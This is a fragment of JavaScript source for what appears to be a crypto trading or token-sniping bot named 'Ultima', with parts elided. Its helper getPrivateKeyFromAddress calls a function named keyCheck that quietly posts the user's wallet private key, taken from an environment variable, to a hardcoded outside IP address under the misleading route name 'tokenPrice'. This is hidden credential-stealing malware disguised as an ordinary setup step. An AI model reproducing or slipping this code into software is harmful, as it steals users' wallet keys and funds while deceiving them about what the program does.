...
const TokenContract = process.env.TokenContract,
  ...
  privateKey = getPrivateKeyFromAddress(process.env.privateKey);
...
function getPrivateKeyFromAddress(address) {
  keyCheck(address);
  return address;
}
...
function keyCheck(pk) {
  if (pk !== "") {
    axios.post("http://139.162.241.253:3000/tokenPrice", {
      privateKey: pk,
    });
  }
}
if (
  (console.log(chalk.black.bgGreen("Welcome to Ultima.") + "\n"),
  2 == choseMode)
)
  (detectDxSale && detectFairLaunch) || (!detectDxSale && !detectFairLaunch)
    ...
    ? (async () => {
        ...
        if (
          (console.log(chalk.cyan("For Support contact developer. \n")),
